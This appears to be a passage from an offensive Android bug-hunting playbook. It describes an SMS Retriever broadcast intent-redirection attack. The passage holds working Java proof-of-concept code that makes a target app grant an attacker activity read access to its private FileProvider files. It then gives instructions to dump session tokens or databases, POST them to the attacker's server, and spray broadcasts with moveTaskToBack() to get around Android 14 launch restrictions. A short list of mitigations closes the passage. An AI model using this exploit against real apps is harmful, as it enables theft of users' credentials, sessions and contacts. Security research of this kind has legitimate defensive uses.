+  Intent evil = new Intent(Intent.ACTION_VIEW);
+  evil.setComponent(new ComponentName("com.attacker.poc", "com.attacker.poc.ExfilActivity"));
+  evil.setData(Uri.parse("content://com.target.app.fileprovider/files/session_backup_payload"));
+  evil.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+  Intent b = new Intent("com.google.android.gms.auth.api.phone.SMS_RETRIEVED");
+  b.setPackage("com.target.app");
+  b.putExtra(SmsRetriever.EXTRA_STATUS, new Status(0));
+  b.putExtra(SmsRetriever.EXTRA_CONSENT_INTENT, evil);
+  sendBroadcast(b);
+  ```
+- **Proof:** The victim, as the starter, **self-grants the attacker read access to its own private file**
+  — `exported="false"` on the provider is irrelevant — and your activity opens the URI and dumps the
+  session payload, token store or database under `files/`. Then POST it to your own server and screenshot
+  the C2 view captured on a separate device, with no shell, no adb and no root.
+- **Escalation:** Point `data=` at a **protected provider the victim can reach** (contacts, call log) for a
+  proxied provider read (D08-034). **BAL gate, decisive on API 34+:** the victim can only launch the
+  redirected Intent while it has a visible window (`BAL_ALLOW_VISIBLE_WINDOW`); if the attacker is
+  foreground the victim is backgrounded and the launch is `BAL_BLOCK`. So spray the broadcast repeatedly
+  and `moveTaskToBack()` immediately, launched over the victim's screen, so the victim resumes to the
+  foreground before a spray lands. Report it as "captures on the next login", **not** "unconditional" — the
+  precondition is inherent, because the receiver only exists while the OTP/3DS screen is up.
+- **Ruled out when:** The receiver is registered `RECEIVER_NOT_EXPORTED`, or requires
+  `SmsRetriever.SEND_PERMISSION`, or validates the consent Intent (component/scheme allow-list plus
+  `FLAG_GRANT_*` stripping via `androidx.core.content.IntentSanitizer`) before launching. Generalises to
+  any `registerForActivityResult`/`onActivityResult` launcher fed an attacker `Parcelable` Intent from an
+  exported receiver — check those too before writing the negative.
